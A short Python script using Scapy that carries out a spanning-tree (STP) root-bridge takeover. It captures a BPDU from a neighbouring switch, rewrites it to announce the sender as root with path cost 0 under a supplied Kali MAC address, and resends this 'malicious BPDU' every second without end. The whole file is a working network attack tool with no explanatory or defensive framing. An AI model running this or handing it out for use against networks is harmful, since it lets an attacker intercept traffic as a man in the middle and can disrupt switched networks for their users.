# v0.1

import sys
import re
from scapy.all import *


int = "eth0"

try:
    mac = sys.argv[1]  
    if not re.match("^([0-9a-f]{2}[:-]){5}[0-9a-f]{2}$", mac.lower()):
        print("MAC address must be in format: 00:11:22:33:44:55, exiting")
        sys.exit(1)
except IndexError:
    print("You must enter Kali's MAC adress, e.g. 00:11:22:33:44:55 as argument")
    sys.exit(1)

# Capture one packet sent from neighbour switch to well-known STP multicast address
pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface=int, count=1)

# Change source MAC
pkt[0].src = mac

# Change bridge MAC to root mac
pkt[0].bridgemac = pkt[0].rootmac

# Change root path cost to 0
pkt[0].pathcost = 0
      
# Change portid to 0
pkt[0].portid = 0

# Send malicious BPDU endlessly
while True:
      time.sleep(1)
      sendp(pkt[0], verbose=1, iface=int)
      




    





